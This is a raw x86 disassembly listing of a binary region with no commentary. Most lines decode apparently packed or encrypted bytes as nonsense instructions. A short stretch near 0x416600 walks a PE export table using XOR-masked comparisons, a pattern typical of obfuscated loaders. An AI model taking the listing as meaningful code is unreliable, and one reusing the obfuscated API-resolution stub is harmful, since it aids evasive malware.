  41606d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41606e:	mov    ecx,ebp
  416070:	aas    
  416071:	in     al,dx
  416072:	fs rol eax,1
  416075:	jns    0x4160f0
  416077:	es cmp al,0x5c
  41607a:	xchg   edi,eax
  41607b:	xor    BYTE PTR [ecx-0x74b80876],bh
  416081:	pop    es
  416082:	fwait
  416083:	cli    
  416084:	das    
  416085:	out    0xbd,al
  416087:	cld    
  416088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416089:	pop    ds
  41608a:	xor    al,0x7a
  41608c:	sub    BYTE PTR [ebp-0x3c300010],cl
  416092:	mov    dh,0xa6
  416094:	cmp    eax,0x98ea2870
  416099:	rep lods eax,DWORD PTR ds:[esi]
  41609b:	frstor [ecx+0x688cccce]
  4160a1:	(bad)  
  4160a2:	in     al,0x61
  4160a4:	test   al,0xbf
  4160a6:	sbb    dl,cl
  4160a8:	mov    ebp,edi
  4160aa:	mov    ds,WORD PTR [ecx+0x639f899b]
  4160b0:	retf   0x6b84
  4160b3:	js     0x4160c6
  4160b5:	loope  0x41609c
  4160b7:	xlat   BYTE PTR ds:[ebx]
  4160b8:	ds xchg edi,eax
  4160ba:	mov    DWORD PTR [ecx],ecx
  4160bc:	sub    al,dl
  4160be:	fstp   DWORD PTR [eax+ebx*4]
  4160c1:	clc    
  4160c2:	and    BYTE PTR [edi-0x7b3be4a7],ah
  4160c8:	cmp    al,0x15
  4160ca:	sbb    al,0xea
  4160cc:	push   ss
  4160cd:	dec    edx
  4160cf:	call   DWORD PTR [esi+0x69]
  4160d2:	mov    ch,0xa5
  4160d4:	ins    DWORD PTR es:[edi],dx
  4160d5:	cmc    
  4160d6:	dec    esp
  4160d7:	loop   0x416069
  4160d9:	cli    
  4160da:	sbb    DWORD PTR [ebp-0x35fd1fe3],ebx
  4160e0:	ja     0x41610c
  4160e2:	add    al,BYTE PTR [edi-0x173fcf9d]
  4160e8:	xchg   BYTE PTR [esi+edi*8+0x10311540],dh
  4160ef:	sbb    BYTE PTR [ebx-0x32fbad9f],0xea
  4160f6:	call   0xbb828604
  4160fb:	xchg   esi,eax
  4160fc:	mov    al,0x76
  4160fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ff:	sub    cl,BYTE PTR [eax]
  416101:	xchg   ebx,eax
  416102:	nop
  416103:	lock call 0x7e8d69d1
  416109:	lods   al,BYTE PTR ds:[esi]
  41610a:	ficom  DWORD PTR [esi-0x65f7ac0f]
  416110:	dec    ebp
  416111:	mov    ch,al
  416113:	pop    ss
  416114:	push   0xf315d9da
  416119:	dec    esi
  41611a:	scas   eax,DWORD PTR es:[edi]
  41611b:	scas   eax,DWORD PTR es:[edi]
  41611c:	stos   DWORD PTR es:[edi],eax
  41611d:	ret    0xeeef
  416120:	cdq    
  416121:	iret   
  416122:	les    esi,FWORD PTR [edi]
  416124:	std    
  416125:	or     DWORD PTR [edi+esi*2+0x2c],ecx
  416129:	xchg   edi,eax
  41612a:	stc    
  41612b:	xor    eax,DWORD PTR [ebx+0x4e]
  41612e:	mov    WORD PTR [edx],?
  416130:	fld    TBYTE PTR [eax+0x29]
  416133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416134:	mov    dh,dh
  416136:	xchg   edi,eax
  416137:	dec    eax
  416138:	fadd   QWORD PTR [esi-0x7]
  41613b:	test   al,0x24
  41613d:	(bad)  
  41613e:	aad    0xf3
  416140:	inc    ecx
  416141:	dec    edx
  416142:	dec    ebx
  416143:	push   ds
  416144:	call   0x5d2d0f87
  416149:	das    
  41614a:	mov    bl,BYTE PTR [esi+0x2d]
  41614d:	sub    bh,BYTE PTR [edx+0x74e8593e]
  416153:	cmp    al,0x66
  416155:	xor    edx,edx
  416157:	cmp    eax,0x60b0c1b0
  41615c:	fiadd  WORD PTR [ecx+eiz*2]
  41615f:	and    al,0xaf
  416161:	add    al,0xf4
  416163:	jb     0x4161c6
  416165:	lods   al,BYTE PTR ds:[esi]
  416166:	jbe    0x416124
  416168:	mov    ah,0x5
  41616a:	pop    ecx
  41616b:	enter  0x30b2,0xef
  41616f:	pushf  
  416170:	ror    esi,cl
  416172:	mov    esi,0x83d43a65
  416177:	xlat   BYTE PTR ds:[ebx]
  416178:	jo     0x4161ea
  41617a:	js     0x41612f
  41617c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41617d:	pop    ds
  41617e:	pop    eax
  41617f:	es add al,0x51
  416182:	out    dx,al
  416183:	sahf   
  416184:	xlat   BYTE PTR ds:[ebx]
  416185:	pop    ecx
  416186:	mov    dh,0x36
  416188:	mov    dl,0x88
  41618a:	call   0x5399:0x3f2c1748
  416191:	jle    0x41617d
  416193:	xchg   BYTE PTR [ebx+0x2f],bh
  416196:	fimul  WORD PTR [edi]
  416198:	call   0xf03:0xcc039992
  41619f:	scas   al,BYTE PTR es:[edi]
  4161a0:	cmp    dh,BYTE PTR [esi-0x69a5de41]
  4161a6:	pop    edi
  4161a7:	xor    ecx,DWORD PTR [edi]
  4161a9:	dec    edx
  4161aa:	mov    ds:0x7b0cf216,al
  4161af:	call   0x16c8781e
  4161b4:	outs   dx,DWORD PTR ds:[esi]
  4161b5:	and    DWORD PTR [esi-0x5ccb0d1e],0x737d005f
  4161bf:	mov    ecx,0xe17c106
  4161c4:	fcmovnbe st,st(7)
  4161c6:	and    ah,BYTE PTR [ecx-0x5d0968b5]
  4161cc:	adc    DWORD PTR [edi+eax*4-0x10],edx
  4161d0:	inc    edx
  4161d1:	dec    esp
  4161d2:	jl     0x4161d4
  4161d4:	jo     0x416175
  4161d6:	pop    es
  4161d7:	shr    DWORD PTR [eax+0x73973b8],1
  4161dd:	push   0x443ea6cf
  4161e2:	lods   al,BYTE PTR ds:[esi]
  4161e3:	shr    DWORD PTR [ecx+0x68],1
  4161e6:	mov    bh,0x6d
  4161e8:	mov    cs:0x2af8ad74,al
  4161ee:	stos   DWORD PTR es:[edi],eax
  4161ef:	(bad)
  4161f2:	dec    ebp
  4161f3:	ret    
  4161f4:	int    0xb
  4161f6:	sbb    al,0x39
  4161f8:	adc    BYTE PTR [edx+0x3c],ch
  4161fb:	(bad)  
  4161fc:	mov    edx,0x265559c7
  416201:	push   ss
  416202:	cmp    eax,0xd34d0581
  416207:	cwde   
  416208:	push   0xf515d5e0
  41620d:	and    DWORD PTR [ebp-0x45d7d5d],esi
  416213:	in     eax,dx
  416214:	and    eax,0xffd91712
  416219:	fsub   st(7),st
  41621b:	pop    eax
  41621c:	dec    edx
  41621d:	aaa    
  41621e:	nop
  41621f:	mov    dl,0x18
  416221:	daa    
  416222:	out    0x80,eax
  416224:	ins    DWORD PTR es:[edi],dx
  416225:	dec    eax
  416226:	popa   
  416227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416228:	int3   
  416229:	xchg   ecx,eax
  41622a:	out    dx,al
  41622b:	pop    edi
  41622c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41622d:	popf   
  41622e:	jne    0x4161bf
  416230:	xor    DWORD PTR [ecx-0x27],0x39
  416234:	inc    esp
  416235:	clc    
  416236:	neg    BYTE PTR [edx-0x6e]
  416239:	popf   
  41623a:	sbb    eax,0x9c223cf9
  41623f:	inc    esp
  416240:	dec    ebp
  416241:	in     eax,dx
  416242:	push   0x38ed41b6
  416247:	test   BYTE PTR [eax],0xfa
  41624a:	mov    ebx,0xf8e3451d
  41624f:	pop    ebx
  416250:	sbb    edi,DWORD PTR [ebx-0x4b32f934]
  416256:	imul   DWORD PTR [esi+0x2fa18582]
  41625c:	dec    ebp
  41625d:	push   eax
  41625e:	mov    ebx,0x5c7e081f
  416263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416264:	xor    BYTE PTR [edi+eiz*2-0x39],ch
  416268:	sbb    DWORD PTR [ebp-0x2],edi
  41626b:	xchg   BYTE PTR [ebx],ch
  41626d:	rcr    BYTE PTR [esi],0x19
  416270:	lods   eax,DWORD PTR ds:[esi]
  416271:	push   ebx
  416272:	jb     0x4162e6
  416274:	dec    esi
  416275:	pop    ss
  416276:	shr    DWORD PTR [esi],1
  416278:	mov    bh,0x85
  41627a:	push   ebx
  41627b:	out    0x78,eax
  41627d:	cmp    cl,BYTE PTR [eax-0x621ec553]
  416283:	fs mov ch,0x4
  416286:	dec    edi
  416287:	(bad)  
  416288:	mov    cl,0xb5
  41628a:	out    0x2d,eax
  41628c:	add    bl,al
  41628e:	cmc    
  41628f:	sbb    BYTE PTR ds:[eax],0x6e
  416293:	icebp  
  416294:	shl    bh,cl
  416296:	ja     0x41630a
  416298:	es mov esi,0x2aaac68b
  41629e:	mov    bh,0x97
  4162a0:	mov    al,ds:0x98c9bc87
  4162a5:	cs mov cl,0xd3
  4162a8:	mov    ds:0x63cdd2c5,al
  4162ad:	add    cl,bl
  4162af:	pop    ebx
  4162b0:	or     ch,BYTE PTR [edi]
  4162b2:	mov    esi,0x31f8c78b
  4162b7:	sub    al,0x1e
  4162b9:	repnz popf 
  4162bb:	mov    esi,esp
  4162bd:	fisub  WORD PTR [ebp+0x6b]
  4162c0:	mov    WORD PTR [edx+0x69],fs
  4162c3:	mov    ch,0x85
  4162c5:	cs mov ebx,fs
  4162c8:	test   DWORD PTR [esi-0x43de68b8],edx
  4162ce:	pop    ds
  4162cf:	xor    edi,DWORD PTR [esi-0x3c]
  4162d2:	sbb    al,0xa4
  4162d4:	pop    eax
  4162d5:	loope  0x416339
  4162d7:	outs   dx,BYTE PTR ds:[esi]
  4162d8:	cmp    al,0x79
  4162da:	(bad)  
  4162dc:	add    cl,0x3c
  4162df:	in     al,dx
  4162e0:	stos   BYTE PTR es:[edi],al
  4162e1:	lock and bl,BYTE PTR [ebp+edi*8-0x41260675]
  4162e9:	xor    al,0x82
  4162eb:	xchg   ebp,eax
  4162ec:	ficom  DWORD PTR [eax+0x27]
  4162ef:	xor    al,0x14
  4162f1:	xlat   BYTE PTR ds:[ebx]
  4162f2:	dec    edi
  4162f3:	mov    es,WORD PTR ds:0xd07d8eb2
  4162f9:	loop   0x4162b7
  4162fb:	setne  al
  4162fe:	adc    esi,DWORD PTR [ecx+0x1]
  416301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416302:	lock in eax,0x96
  416305:	add    ebx,DWORD PTR [ecx]
  416307:	aaa    
  416308:	add    BYTE PTR [esi-0x30],0xfa
  41630c:	repz add al,0x2d
  41630f:	inc    eax
  416310:	mov    WORD PTR [ecx],cs
  416312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416313:	sbb    BYTE PTR [ebx+eax*4-0x63],dh
  416317:	jge    0x4162d1
  416319:	dec    ebp
  41631a:	cmp    al,0x99
  41631c:	stc    
  41631d:	lahf   
  41631e:	(bad)  
  41631f:	in     eax,dx
  416320:	call   0x3917:0x2796fa85
  416327:	jnp    0x4162a9
  416329:	pushf  
  41632a:	not    BYTE PTR [ecx+ecx*4]
  41632d:	leave  
  41632e:	inc    ecx
  41632f:	scas   al,BYTE PTR es:[edi]
  416330:	cli    
  416331:	mov    ds:0x83d8cdff,eax
  416336:	cld    
  416337:	jmp    0x6c1192d8
  41633c:	or     BYTE PTR [edi],ch
  41633e:	xchg   edi,eax
  41633f:	icebp  
  416340:	fbld   TBYTE PTR [eax-0x22dda888]
  416346:	call   0xa5495d41
  41634b:	mov    edi,DWORD PTR [esi]
  41634d:	push   cx
  41634f:	fisub  WORD PTR [esi+ebp*4]
  416352:	test   eax,0x4b68e2b0
  416357:	rcr    DWORD PTR [ecx+0x3c],0x76
  41635b:	or     DWORD PTR [edx-0x13],esi
  41635e:	jne    0x4162e0
  416360:	mov    eax,0x35c641a8
  416365:	sysexit 
  416367:	adc    DWORD PTR [ecx-0x3b],0x54f0eb9
  41636e:	shl    ch,cl
  416370:	and    eax,0x512d9359
  416375:	pop    ecx
  416376:	fsubr  st,st(6)
  416378:	xchg   ecx,eax
  416379:	inc    eax
  41637a:	and    dl,BYTE PTR [ecx]
  41637c:	fwait
  41637d:	jle    0x41637d
  41637f:	in     eax,0x10
  416381:	sti    
  416382:	and    ebp,eax
  416384:	sbb    eax,0xcb13c1a3
  416389:	adc    BYTE PTR [eax-0x4b8cfa58],bl
  41638f:	or     BYTE PTR [eax-0x70],bh
  416392:	cld    
  416393:	add    ah,BYTE PTR [edx]
  416395:	cmp    BYTE PTR [ecx],0x1a
  416398:	mov    BYTE PTR [ecx],ch
  41639a:	sub    eax,0x1499e05b
  41639f:	dec    esi
  4163a0:	xchg   DWORD PTR [ecx+0x42],esi
  4163a3:	in     al,dx
  4163a4:	sbb    eax,0xec8a3bf4
  4163a9:	adc    bl,BYTE PTR [ebp-0x56]
  4163ac:	ss jecxz 0x4163ba
  4163af:	dec    ecx
  4163b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b1:	mov    bl,ah
  4163b3:	pop    ss
  4163b4:	ds push esp
  4163b6:	jmp    0x5dcf:0x49f1466e
  4163bd:	jecxz  0x4163cb
  4163bf:	lock test eax,0xb1865c91
  4163c5:	mov    cl,0x70
  4163c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c8:	stc    
  4163c9:	mov    al,0x55
  4163cb:	xor    ebp,0x94df89b3
  4163d1:	fucomip st,st(5)
  4163d3:	lock and DWORD PTR [edx-0x77a577c0],esp
  4163da:	mov    cl,0x58
  4163dc:	and    eax,0xe8719803
  4163e1:	jle    0x4163db
  4163e3:	inc    ecx
  4163e4:	xchg   al,bh
  4163e6:	add    DWORD PTR [ebx-0x78524f14],0xffffff88
  4163ed:	push   ds
  4163ee:	xchg   ebp,eax
  4163ef:	int    0x4f
  4163f1:	push   cs
  4163f2:	int3   
  4163f3:	push   es
  4163f4:	xchg   esi,eax
  4163f5:	int    0xad
  4163f7:	mov    eax,DWORD PTR [edi+edx*8-0x7b]
  4163fb:	das    
  4163fc:	xchg   cl,al
  4163fe:	inc    edi
  4163ff:	call   0x3e2d:0xe1a6972a
  416406:	scas   al,BYTE PTR es:[edi]
  416407:	dec    edx
  416408:	jge    0x416396
  41640a:	(bad)  
  41640b:	ins    BYTE PTR es:[edi],dx
  41640c:	pop    edx
  41640d:	jl     0x4163b8
  41640f:	jb     0x41639f
  416411:	pop    eax
  416412:	loop   0x41645e
  416414:	fisttp WORD PTR [edi+0x64]
  416417:	mov    eax,0x626731e4
  41641c:	dec    ecx
  41641d:	ds xor al,0xf5
  416420:	inc    esp
  416421:	call   0xe746c4a1
  416426:	lock or DWORD PTR [ecx],esi
  416429:	inc    ecx
  41642a:	jno    0x416471
  41642c:	adc    al,0xc1
  41642e:	push   es
  41642f:	fdivr  DWORD PTR [esi+0x669fc92d]
  416435:	clc    
  416436:	pushf  
  416437:	ret    0x8f66
  41643a:	mov    eax,ds:0x9072ca8c
  41643f:	push   es
  416440:	ins    BYTE PTR es:[edi],dx
  416441:	leave  
  416442:	dec    edi
  416443:	mov    al,0x1c
  416445:	shl    WORD PTR [edi],0xb0
  416449:	mov    cl,0xcc
  41644b:	xchg   ebp,eax
  41644c:	jo     0x416453
  41644e:	mov    al,ds:0x3881d390
  416453:	or     ebp,DWORD PTR [ebx-0x6e20971c]
  416459:	pop    ds
  41645a:	dec    edi
  41645b:	push   edi
  41645c:	lds    edi,FWORD PTR [eax-0x2d]
  41645f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416460:	rcr    edx,0xe8
  416463:	add    DWORD PTR [ecx],esi
  416465:	pusha  
  416466:	fsub   DWORD PTR [ebx+0x4f]
  416469:	adc    ebp,DWORD PTR [ebx]
  41646b:	mov    ebp,0xbba6312a
  416470:	scas   al,BYTE PTR es:[edi]
  416471:	adc    al,0x3e
  416473:	lahf   
  416474:	test   BYTE PTR [edi],0x35
  416477:	push   eax
  416478:	adc    BYTE PTR [ebp-0x35344a42],al
  41647e:	mov    BYTE PTR [ebp+ecx*8+0x2c],0x60
  416483:	imul   esp,DWORD PTR [esi-0x40],0x39e3d7e6
  41648a:	mov    ecx,0xa020b8b8
  41648f:	shr    BYTE PTR [esi],0x20
  416492:	in     eax,0xe4
  416494:	mov    esp,0x55ce8dd4
  416499:	push   ss
  41649a:	(bad)  
  41649b:	sub    esp,DWORD PTR [ebp+0x261002c]
  4164a1:	adc    al,0x5c
  4164a3:	inc    esi
  4164a4:	pop    eax
  4164a5:	cdq    
  4164a6:	inc    edi
  4164a7:	lock adc eax,0x6a3e6b6c
  4164ad:	cs push ecx
  4164af:	inc    esp
  4164b0:	das    
  4164b1:	mov    BYTE PTR fs:[ecx-0x2ee60095],ch
  4164b8:	xchg   esi,eax
  4164b9:	or     cl,BYTE PTR [esi+0x4f]
  4164bc:	push   edx
  4164be:	adc    esp,DWORD PTR [esi]
  4164c0:	xor    al,0x61
  4164c2:	push   cs
  4164c3:	jae    0x4164e0
  4164c5:	mov    esp,DWORD PTR [edx+ebx*4-0x71]
  4164c9:	lds    ebp,FWORD PTR [esi+0x707f0de1]
  4164cf:	mov    DWORD PTR [ecx+0x51],esi
  4164d2:	mov    ecx,0x9db44c7a
  4164d7:	aaa    
  4164d8:	mov    cl,0xd4
  4164da:	ss sbb dl,dh
  4164dd:	repz and al,0x7f
  4164e0:	js     0x41646e
  4164e2:	mov    edi,DWORD PTR [ebx+eax*8+0x5f96cfad]
  4164e9:	pop    edx
  4164ea:	imul   eax,edi,0xd4e39fb9
  4164f0:	pop    ecx
  4164f1:	call   0xdcc4f3c3
  4164f6:	ret    
  4164f7:	or     al,0x1f
  4164f9:	sti    
  4164fa:	and    eax,0x37287495
  4164ff:	pushf  
  416500:	mov    ch,0x45
  416502:	xchg   edx,eax
  416503:	inc    ebx
  416504:	pop    ds
  416505:	jo     0x41652b
  416507:	fdivr  QWORD PTR [edi+0x170c2f1a]
  41650d:	sub    ecx,DWORD PTR [edx+0xd]
  416510:	repnz imul edx,DWORD PTR [eax-0x611c94ff],0xffffffc4
  416518:	in     eax,dx
  416519:	xchg   edx,eax
  41651a:	paddusb mm6,QWORD PTR [esi-0x7]
  41651e:	jmp    0xafed:0x3a675bb8
  416525:	shr    DWORD PTR ds:0xd5cdd475,cl
  41652b:	sbb    DWORD PTR [ebx-0x59be6c7],eax
  416531:	les    ebx,FWORD PTR [edi-0x374f21cc]
  416537:	mov    edx,0xf595253b
  41653c:	and    DWORD PTR [ebp-0x7f],esp
  41653f:	or     eax,0x42b8c181
  416544:	xor    ebp,ebp
  416546:	popa   
  416547:	ja     0x4165a4
  416549:	mov    edi,0xeb61d6d1
  41654e:	(bad)  
  41654f:	pop    es
  416550:	retf   0x8316
  416553:	test   bh,0x46
  416556:	pop    edx
  416557:	leave  
  416558:	and    DWORD PTR cs:[ecx],esi
  41655b:	sub    dl,BYTE PTR [edx-0x36711cc]
  416561:	jg     0x4165c1
  416563:	clc    
  416564:	(bad)  
  416565:	or     ah,BYTE PTR [edi-0x753d3a47]
  41656b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41656c:	xor    BYTE PTR [ebp+0x519880f0],dl
  416572:	xchg   esp,eax
  416573:	fs sub al,0xfd
  416576:	push   esp
  416577:	xor    DWORD PTR [ebx],eax
  416579:	jl     0x41652a
  41657b:	and    eax,0xc2e01342
  416580:	div    ebx
  416582:	jge    0x416530
  416584:	pusha  
  416585:	(bad)  
  416586:	adc    eax,0x3de85d13
  41658b:	xchg   ebx,eax
  41658c:	xor    cl,BYTE PTR [ebp+0x6283be68]
  416592:	nop    DWORD PTR [esi-0x45e0df94]
  416599:	push   esi
  41659a:	out    0x4,eax
  41659c:	xor    cl,BYTE PTR [ecx]
  41659e:	jnp    0x4165a4
  4165a0:	fst    DWORD PTR [esi+esi*4-0x3ee40e69]
  4165a7:	out    dx,al
  4165a8:	mov    bl,BYTE PTR [edx]
  4165aa:	int3   
  4165ab:	inc    edx
  4165ac:	push   ebx
  4165ad:	mov    dl,0x9e
  4165af:	out    0xb2,al
  4165b1:	mov    eax,0xf8ca032b
  4165b6:	or     ch,BYTE PTR [ebx]
  4165b8:	adc    eax,0x71ec9cc3
  4165bd:	mov    bh,0x4f
  4165bf:	mov    bl,0xcc
  4165c1:	lahf   
  4165c2:	int    0x82
  4165c4:	fisttp QWORD PTR ds:0xdbacabac
  4165ca:	sbb    al,0xf8
  4165cc:	adc    al,ch
  4165ce:	out    0x63,eax
  4165d0:	imul   edx,DWORD PTR [esi],0x687a8b4a
  4165d6:	jns    0x416560
  4165d8:	jp     0x4165fa
  4165da:	adc    cl,BYTE PTR [ebx]
  4165dc:	inc    esp
  4165dd:	inc    ebx
  4165de:	adc    esi,DWORD PTR [eax+0x22]
  4165e1:	jne    0x416635
  4165e3:	(bad)  
  4165e4:	pop    ss
  4165e5:	sbb    BYTE PTR [ecx+0x38de5356],bl
  4165eb:	adc    al,BYTE PTR [edx+edx*8+0x34cc6767]
  4165f2:	add    ebx,DWORD PTR [ebx+0x26]
  4165f5:	stos   BYTE PTR es:[edi],al
  4165f6:	shr    BYTE PTR fs:[eax+0x39],cl
  4165fa:	jne    0x416622
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dl,bh
  416673:	clc    
  416674:	lock (bad) 
  416677:	and    esp,DWORD PTR [ecx+0x62]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	or     esi,DWORD PTR [edx+0x5c]
  416681:	xor    esi,esi
  416683:	lods   al,BYTE PTR ds:[esi]
  416684:	jnp    0x416625
  416686:	mov    esp,0x64ae4b65
  41668b:	mov    cl,0xa3
  41668d:	test   DWORD PTR [esi+ecx*8],edx
  416690:	jp     0x41667f
  416692:	test   eax,0xaf52697c
  416697:	retf   0xe8bf
  41669a:	hlt    
  41669b:	popf   
  41669c:	ret    
  41669d:	hlt    
  41669e:	mov    edx,0x21d2a888
  4166a3:	(bad)  
  4166a4:	mov    al,ds:0x570e5397
  4166a9:	dec    ebp
  4166aa:	ss inc esi
  4166ac:	sub    al,BYTE PTR [ebx+0x75]
  4166af:	shl    BYTE PTR [ebx+0x6a],0x2a
  4166b3:	mov    ds:0x5e6454dd,al
  4166b8:	adc    al,0xcb
  4166ba:	inc    DWORD PTR [edx+0x619aef37]
  4166c0:	fisub  DWORD PTR [esi+ebp*8-0x69]
  4166c4:	enter  0x2d42,0x1b
  4166c8:	add    eax,0x1312b767
  4166cd:	push   esi
  4166ce:	adc    DWORD PTR [eax-0x5cb3cb18],esp
  4166d4:	xor    al,0x77
  4166d6:	xchg   BYTE PTR [eax-0x58381d55],ah
  4166dc:	jp     0x416699
  4166de:	or     DWORD PTR [esi],ebp
  4166e0:	lahf   
  4166e1:	scas   eax,DWORD PTR es:[edi]
  4166e2:	rol    eax,0x4e
  4166e5:	add    DWORD PTR [eax],eax
  4166e7:	xor    DWORD PTR [eax-0x6b5961aa],0xffffffbd
  4166ee:	jns    0x4166e1
  4166f0:	dec    ebx
  4166f1:	iret   
  4166f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166f3:	mov    eax,0x3789f7b5
  4166f8:	inc    ebx
  4166f9:	test   al,0xbe
  4166fb:	sub    esp,ecx
  4166fd:	pop    ecx
  4166fe:	mov    dh,0x5b
  416700:	jmp    0x86d3:0x18bdf40
  416707:	cmp    eax,0xc3d7a13a
  41670c:	dec    edi
  41670d:	jp     0x41673a
  41670f:	(bad)  
  416710:	push   0xc75cd304
  416715:	test   eax,0xa9e662f2
  41671a:	lock xchg ebp,eax
  41671c:	cli    
  41671d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671e:	adc    eax,0xef3c8c8
  416723:	test   DWORD PTR [ecx],esp
  416725:	out    dx,eax
  416726:	das    
  416727:	pop    ebx
  416728:	ss push eax
  41672a:	jmp    0x2e1a3b
  41672f:	pop    ebx
  416730:	out    0x13,al
  416732:	sub    BYTE PTR [ebx-0x12],0xa9
  416736:	sub    al,0x9a
  416738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416739:	stos   BYTE PTR es:[edi],al
  41673a:	dec    esi
  41673b:	ret    0x494a
  41673e:	iret   
  41673f:	aad    0x46
  416741:	bound  ebx,QWORD PTR [edi+0x32bb3de]
  416747:	or     ecx,ecx
  416749:	mov    ebp,0x70675d88
  41674e:	push   0x5e
  416750:	not    ecx
  416752:	cmp    eax,0x1e58dd36
  416757:	mov    ch,0x31
  416759:	pop    ss
  41675a:	or     esi,edi
  41675c:	cmp    DWORD PTR es:[edi],ecx
  41675f:	or     DWORD PTR [esi],ebp
  416761:	(bad)  
  416762:	push   edi
  416763:	dec    edi
  416764:	xor    BYTE PTR [eax-0x5ad00701],0x4c
  41676b:	dec    BYTE PTR [ebx+edx*1+0x541687fa]
  416772:	jge    0x4167ed
  416774:	test   eax,0x2c72487b
  416779:	mov    edx,0x2cbded0d
  41677e:	inc    edx
  41677f:	jnp    0x4167ab
  416781:	lods   al,BYTE PTR ds:[esi]
  416782:	pop    esp
  416783:	dec    esi
  416784:	mov    ds:0x4034ed7d,eax
  416789:	dec    ebx
  41678a:	(bad)
  41678d:	push   ss
  41678e:	and    al,0x6f
  416790:	mov    ebx,0xf4d4d4ad
  416795:	call   0x9a0e:0x8d9cadeb
  41679c:	or     al,0xaa
  41679e:	je     0x416744
  4167a0:	ror    DWORD PTR [ebx+0x24],cl
  4167a3:	cdq    
  4167a4:	pop    ecx
  4167a5:	(bad)  
  4167a6:	jae    0x41677d
  4167a8:	into   
  4167a9:	popa   
  4167aa:	xchg   cl,bl
  4167ac:	ret    0x56fb
  4167af:	stc    
  4167b0:	push   es
  4167b1:	inc    edi
  4167b2:	daa    
  4167b3:	(bad)  
  4167b4:	xor    ebx,DWORD PTR [edx]
  4167b6:	data16 fwait
  4167b8:	loope  0x416754
  4167ba:	nop
  4167bb:	dec    esp
  4167bc:	cwde   
  4167bd:	fcom   QWORD PTR [edx+0x70d2dc76]
  4167c3:	mov    al,ds:0xf8a93c29
  4167c8:	adc    bl,BYTE PTR [edx]
  4167ca:	mov    ds:0xf6af050c,eax
  4167cf:	xchg   ecx,eax
  4167d0:	xor    esp,ecx
  4167d2:	call   0xcaaa14d3
  4167d7:	clc    
  4167d8:	push   ebp
  4167d9:	jns    0x416834
  4167db:	popf   
  4167dc:	(bad)  
  4167dd:	cld    
  4167de:	icebp  
  4167df:	pop    ss
  4167e0:	pusha  
  4167e1:	add    DWORD PTR [esi+eiz*1],0xffffffec
  4167e5:	dec    edi
  4167e6:	lahf   
  4167e7:	xchg   ecx,eax
  4167e8:	into   
  4167e9:	sub    BYTE PTR ds:0xdf19b619,dh
  4167ef:	sqrtps xmm0,XMMWORD PTR [esi+0x22]
  4167f3:	rcl    dh,0xa2
  4167f6:	pop    es
  4167f7:	pop    esi
  4167f8:	sar    DWORD PTR [edi],cl
  4167fa:	push   0x5a
  4167fc:	lea    edi,[ebx]
  4167fe:	gs cdq 
  416800:	in     eax,0x38
  416802:	push   0xfffffffe
  416804:	jmp    0xe441:0x8f76a50a
  41680b:	imul   eax,esi,0x30
  41680e:	retf   0x77df
  416811:	leave  
  416812:	jge    0x4167be
  416814:	gs jge 0x4167b4
  416817:	mov    ecx,0x26af10a8
  41681c:	std    
  41681d:	push   0x564886a9
  416822:	scas   eax,DWORD PTR es:[edi]
  416823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416824:	bound  ebp,QWORD PTR [esi]
  416826:	int    0x4f
  416828:	cmc    
  416829:	scas   al,BYTE PTR es:[edi]
  41682a:	add    DWORD PTR [edx-0x4e],0xffffffa1
  41682e:	add    esp,eax
  416830:	lea    eax,[eax+0x56]
  416833:	dec    esp
  416834:	adc    al,0xcb
  416836:	call   0x31b1765
  41683b:	test   al,0xcf
  41683d:	int3   
  41683e:	adc    edx,DWORD PTR [ebp+0x3b]
  416841:	cmp    al,0xfb
  416843:	aas    
  416844:	test   al,0x6b
  416846:	push   ecx
  416847:	fscale 
  416849:	and    DWORD PTR [edx+eax*4],edi
  41684c:	xchg   esi,eax
  41684d:	xor    DWORD PTR [edx+eax*4+0x2b76e97],0xbc26bd20
  416858:	mov    ah,BYTE PTR [edi+ebp*8]
  41685b:	or     esp,esi
  41685d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41685e:	outs   dx,DWORD PTR ds:[esi]
  41685f:	xor    bl,BYTE PTR [ebx-0x6a]
